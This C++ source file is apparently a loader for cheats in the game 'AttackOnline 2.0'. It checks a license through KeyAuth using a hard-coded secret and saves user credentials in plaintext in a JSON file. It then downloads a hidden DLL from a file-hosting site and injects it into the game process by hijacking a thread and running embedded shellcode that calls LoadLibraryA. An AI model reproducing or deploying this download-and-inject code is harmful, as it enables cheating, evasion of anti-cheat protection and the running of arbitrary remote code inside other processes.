#include <Windows.h>
#include <string>
#include <auth.hpp>
#include "utils.hpp"
#include "skStr.h"
#include <TlHelp32.h>
#include <xstring>
#include "Injections.h"
#include "Xorstr.h"
#include <sha256.h>
#include <xutility>
#include <ostream>
#include <string>
#include <stdio.h>
#include <filesystem>
#include <chrono>
#include <thread>
#include <locale>
#include <codecvt>
#include <iostream>
#include <Lmcons.h>
#include <fstream>
#include <string>
//#include <urlmon.h>
#include <conio.h>
#include <urlmon.h>
#include <string>

#pragma comment(lib, "urlmon.lib")
//#include "Mapping.h"

std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);
const std::string compilation_date = (std::string)skCrypt(__DATE__);
const std::string compilation_time = (std::string)skCrypt(__TIME__);

#pragma comment(lib, "ntdll.lib")

using namespace KeyAuth;
using namespace std;

std::string name = skCrypt("VIP").decrypt();
std::string ownerid = skCrypt("bIIRsaoslQ").decrypt();
std::string secret = skCrypt("d9822c0d76785ac100b6255550e65cf30789fd316e6cd32c1a11856104962b22").decrypt();
std::string version = skCrypt("6.7").decrypt();
std::string url = skCrypt("https://keyauth.win/api/1.2/").decrypt(); // change if you're self-hosting
std::string path = skCrypt("").decrypt(); //optional, set a path if you're using the token validation setting


//bytes make with download in api keytauth for download dll
std::vector<std::uint8_t> bytes;

#define FOREGROUND_BLACK    0x0000
#define FOREGROUND_BLUE     0x0001
#define FOREGROUND_GREEN    0x0002
#define FOREGROUND_CYAN     0x0003
#define FOREGROUND_RED      0x0004
#define FOREGROUND_MAGENTA  0x0005
#define FOREGROUND_YELLOW   0x0006
#define FOREGROUND_WHITE    0x0007

#define BACKGROUND_BLACK    0x0000
#define BACKGROUND_BLUE     0x0010
#define BACKGROUND_GREEN    0x0020
#define BACKGROUND_CYAN     0x0030
#define BACKGROUND_RED      0x0040
#define BACKGROUND_MAGENTA  0x0050
#define BACKGROUND_YELLOW   0x0060
#define BACKGROUND_WHITE    0x0070


//Color Set In Console
void setcolor(unsigned short color)
{
    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hcon, color);
}

unsigned short getRandomColor()
{
    // Random foreground and background color
    unsigned short foreground = 0x0001 << (rand() % 8); // Random foreground color
    //unsigned short background = 0x0010 << (rand() % 8); // Random background color

    return foreground;
}

void random()
{
    srand(static_cast<unsigned>(time(0))); // Seed the random number generator

    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);

    for (int i = 0; i < 10; ++i) // Display 10 random color messages
    {
        unsigned short color = getRandomColor();
        setcolor(color);
        std::cout << "This is some random color text!" << std::endl;
        Sleep(500); // Pause for a bit to see the effect
    }

    // Reset to default color
    setcolor(FOREGROUND_WHITE | BACKGROUND_BLACK);
    std::cout << "Back to default color." << std::endl;
}

//=================== convert string to wstring =========================//

std::wstring StringToWString(const std::string& str) {
    int length = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(length, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], length);
    return wstr;
}

HRESULT DownloadFile(const std::wstring& url, const std::wstring& filePath) {
    HRESULT hr = URLDownloadToFileW(
        NULL,
        url.c_str(),
        filePath.c_str(),
        0,
        NULL
    );

    if (SUCCEEDED(hr)) {
        SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    return hr;
}


//Generator Random Name
std::string generateRandomName() {
    std::string name;
    srand(time(0));
    

    for (int i = 0; i < 10; ++i) {
        if (i % 2 == 0) {
            char c = ('a') + rand() % 26;
            name += c;
        }
        else {
            char c = 'A' + rand() % 26;
            name += c;
        }
        if (i % 2 == 0)
        {
            char c = '1' + rand() % 26;
            name += c;
        }
        //else {
        //    char c = '!' + rand() % 26;
        //    name += c;
        //}
    }
    return name;
}


//Name HexagondLogger
void HexagondLogger() {
    //random();
    std::cout << (XorStr("                                                    ")) << std::endl;
    std::cout << (XorStr("                            _____ __ __ _____ __    ")) << std::endl;
    std::cout << (XorStr("                           |  |  |  |  |   __|  |   ")) << std::endl;
    std::cout << (XorStr("                           |     |-   -|  |  |  |__ ")) << std::endl;
    std::cout << (XorStr("                           |__|__|__|__|_____|_____|")) << std::endl;
    std::cout << (XorStr("                                                    ")) << std::endl;
}                                                    

api KeyAuthApp(name, ownerid, secret, version, url, path);

void SetConsoleTransparency(HWND hwnd, BYTE transparency) {
    LONG style = GetWindowLong(hwnd, GWL_EXSTYLE);
    SetWindowLong(hwnd, GWL_EXSTYLE, style | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, 0, transparency, LWA_ALPHA);
}



int auth()
{

    //HWND hwnd = GetConsoleWindow();

   

    std::string consoleTitle = generateRandomName();
    name.clear(); ownerid.clear(); secret.clear(); version.clear(); url.clear();
    SetConsoleTitleA(consoleTitle.c_str());
    setcolor(FOREGROUND_CYAN);
    KeyAuthApp.init();
    if (!KeyAuthApp.response.success)
    {
        std::cout << generateRandomName << KeyAuthApp.response.message;
        Sleep(1500);
        exit(1);
    }

    if (std::filesystem::exists(("C:\\Windows\\Temp\\fnDNerucF.json"))) // change to your .json autologin path
    {
        if (!CheckIfJsonKeyExists((XorStr("C:\\Windows\\Temp\\fnDNerucF.json")), (XorStr("username"))))
        {
            std::string key = ReadFromJson(XorStr("C:\\Windows\\Temp\\fnDNerucF.json"), (XorStr("license")));
            KeyAuthApp.license(key);
            if (!KeyAuthApp.response.success)
            {
                std::remove(("C:\\Windows\\Temp\\fnDNerucF.json"));

                Sleep(1500);
                exit(1);
            }
            HexagondLogger();
            //std::cout << skCrypt("[+] Wooooo !\n");
            Sleep(2000);
        }
        else
        {
            std::string username = ReadFromJson((XorStr("C:\\Windows\\Temp\\fnDNerucF.json")), (XorStr("username")));
            std::string password = ReadFromJson((XorStr("C:\\Windows\\Temp\\fnDNerucF.json")), (XorStr("password")));
            KeyAuthApp.login(username, password);
            if (!KeyAuthApp.response.success)
            {
                std::remove(skCrypt("C:\\Windows\\Temp\\fnDNerucF.json"));

                Sleep(1500);
                exit(1);
            }
            HexagondLogger();
            //std::cout << skCrypt("[+] Wooooo !\n");
            Sleep(2000);
        }
    }
    else
    {

        HexagondLogger();



        int option;
        std::string username;
        std::string password;
        std::string key;


            std::cout << skCrypt("[") << compilation_time << skCrypt("]") << skCrypt(" username-> ");
            std::cin >> username;
            std::cout << skCrypt("[") << compilation_time << skCrypt("]") << skCrypt(" password-> ");
            char ch;
            while ((ch = _getch()) != '\r') {  // Read until Enter key is pressed
                if (ch == '\b') {  // Handle backspace
                    if (!password.empty()) {
                        password.pop_back();
                        std::cout << "\b \b";  // Erase character from console
                    }
                }
                else {
                    password += ch;
                    std::cout << '*';  // Display asterisks for each character
                }
            }
            std::cout << std::endl;
            //std::cin >> password;
            KeyAuthApp.login(username, password);
            if (!KeyAuthApp.response.success)
            {
                std::cout << skCrypt("[") << compilation_time << skCrypt("]") << skCrypt(" Status: ") << KeyAuthApp.response.message;
                Sleep(2500);
                exit(0);
            }
        


        if (!KeyAuthApp.response.success)
        {

            Sleep(1500);
            exit(1);
        }
        if (username.empty() || password.empty())
        {
            WriteToJson(XorStr("C:\\Windows\\Temp\\fnDNerucF.json"), (XorStr("license")), key, false, XorStr(""), XorStr(""));

        }
        else
        {
            WriteToJson(XorStr("C:\\Windows\\Temp\\fnDNerucF.json"), (XorStr("username")), username, true, (XorStr("password")), password);

        }


    }

    for (int i = 0; i < KeyAuthApp.user_data.subscriptions.size(); i++) {
        auto sub = KeyAuthApp.user_data.subscriptions.at(i);
        std::cout << skCrypt(" name: ") << sub.name;
        std::cout << skCrypt(" : expiry: ") << tm_to_readable_time(timet_to_tm(string_to_timet(sub.expiry)));
        Sleep(2000);
    }



    return 0;
}

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);


#define SE_DEBUG_PRIVILEGE 20

char shell_code[] =
{
    0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEB, 0x06, 0x00, 0x00,
    0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0x8D, 0x93, 0x22, 0x00, 0x00, 0x00,
    0x52, 0xFF, 0xD0, 0x61, 0x68, 0xCC, 0xCC, 0xCC, 0xCC, 0xC3
};

void get_proc_id(const char* window_title, DWORD& process_id)
{
    GetWindowThreadProcessId(FindWindow(NULL, window_title), &process_id);
}

void error(const char* error_title, const char* error_message)
{
    MessageBox(NULL, error_message, error_title, NULL);
    exit(-1);
}

bool file_exists(string file_name)
{
    struct stat buffer;
    return (stat(file_name.c_str(), &buffer) == 0);
}

int main()
{
    LPBYTE ptr;
    HANDLE h_process, h_thread, h_snap;
    PVOID allocated_memory, buffer;
    DWORD proc_id;
    BOOLEAN buff;

    THREADENTRY32 te32;
    CONTEXT ctx;

    //CreateThread(0, 0, (LPTHREAD_START_ROUTINE)generateRandomName,0,0,0);

    HWND console = GetConsoleWindow();
            RECT r;

            GetWindowRect(console, &r);
            MoveWindow(console, r.left, r.top, 710, 385, TRUE);
            AdjustWindowRect(&r, GetWindowLong(console, GWL_STYLE), FALSE);
            SetConsoleTransparency(console, 460); // Example: 180 is semi-transparent

            auth();
    
            system(skCrypt("cls"));

            std::string url = (XorStr("https://files.catbox.moe/ss0gkt.dll")); // URL del archivo a descargar
            std::string filePath = (XorStr("C:\\Windows\\ss0gkt.dll"));

    char dll_path[MAX_PATH];
    const char* dll_name = "C:\\Windows\\ss0gkt.dll";
    const char* window_title = "AttackOnline 2.0";
    //const char* window_title = "Mission Against Terror";

    std::wstring wUrl = StringToWString(url);
    std::wstring wFilePath = StringToWString(filePath);

    HRESULT result = DownloadFile(wUrl, wFilePath);

    HWND MAT = FindWindowA(skCrypt("AttackOnline 2.0"), nullptr);
    
        MessageBox(MAT, skCrypt("Click In Lobby"), skCrypt("0DMN8S2DS"), MB_OK | MB_ICONQUESTION);

    te32.dwSize = sizeof(te32);
    ctx.ContextFlags = CONTEXT_FULL;

    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &buff);

    if (!file_exists(dll_name))
    {
        error("file_exists", "File doesn't exist");
    }

    if (!GetFullPathName(dll_name, MAX_PATH, dll_path, nullptr))
    {
        error("GetFullPathName", "Failed to get full path");
    }

    get_proc_id(window_title, proc_id);
    if (proc_id == NULL)
    {
        error("get_proc_id", "Failed to get process ID");
    }

    h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc_id);
    if (!h_process)
    {
        error("OpenProcess", "Failed to open a handle to the process");
    }

    h_snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);

    Thread32First(h_snap, &te32);

    while (Thread32Next(h_snap, &te32))
    {
        if (te32.th32OwnerProcessID == proc_id)
        {
            break;
        }
    }

    CloseHandle(h_snap);

    allocated_memory = VirtualAllocEx(h_process, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocated_memory)
    {
        CloseHandle(h_process);
        error("VirtualAllocEx", "Failed to allocate memory");
    }

    h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
    if (!h_thread)
    {
        VirtualFreeEx(h_process, allocated_memory, NULL, MEM_RELEASE);
        CloseHandle(h_process);
        error("OpenThread", "Failed to open a handle to the thread");
    }

    SuspendThread(h_thread);
    GetThreadContext(h_thread, &ctx);

    buffer = VirtualAlloc(NULL, 65536, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ptr = (LPBYTE)buffer;

    memcpy(buffer, shell_code, sizeof(shell_code));

    while (1)
    {
        if (*ptr == 0xb8 && *(PDWORD)(ptr + 1) == 0xCCCCCCCC)
        {
            *(PDWORD)(ptr + 1) = (DWORD)LoadLibraryA;
        }

        if (*ptr == 0x68 && *(PDWORD)(ptr + 1) == 0xCCCCCCCC)
        {
            *(PDWORD)(ptr + 1) = ctx.Eip;
        }

        if (*ptr == 0xc3)
        {
            ptr++;
            break;
        }

        ptr++;
    }

    strcpy((char*)ptr, dll_path);

    if (!WriteProcessMemory(h_process, allocated_memory, buffer, sizeof(shell_code) + strlen((char*)ptr), nullptr))
    {
        VirtualFreeEx(h_process, allocated_memory, NULL, MEM_RELEASE);
        ResumeThread(h_thread);

        CloseHandle(h_thread);
        CloseHandle(h_process);

        VirtualFree(buffer, NULL, MEM_RELEASE);
        error("WriteProcessMemory", "Failed to write process memory");
    }

    ctx.Eip = (DWORD)allocated_memory;

    if (!SetThreadContext(h_thread, &ctx))
    {
        VirtualFreeEx(h_process, allocated_memory, NULL, MEM_RELEASE);
        ResumeThread(h_thread);

        CloseHandle(h_thread);
        CloseHandle(h_process);

        VirtualFree(buffer, NULL, MEM_RELEASE);
        error("SetThreadContext", "Failed to set thread context");
    }

    ResumeThread(h_thread);

    CloseHandle(h_thread);
    CloseHandle(h_process);

    VirtualFree(buffer, NULL, MEM_RELEASE);

    //MessageBox(NULL, "Successfully injected", "Success!", NULL);
    //printf(skCrypt("[+] successfully injected!, closing in 5 seconds..."));
    cout << "[" << compilation_time << "]" << " successfully injected!, closing in 5 seconds..." << endl;
    Sleep(5000);
 
    if (std::remove(skCrypt("C:\\Windows\\ygafu2.dll")) == 0) {

        std::cout << "File successfully deleted." << std::endl;
    }
    else {
        std::perror("Error deleting file");
    }

    return 0;
}

std::string tm_to_readable_time(tm ctx) {
    char buffer[80];

    strftime(buffer, sizeof(buffer), skCrypt("%a %m/%d/%y %H:%M:%S %Z"), &ctx);

    return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
    auto cv = strtol(timestamp.c_str(), NULL, 10); // long

    return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
    std::tm context;

    localtime_s(&context, &timestamp);

    return context;
}
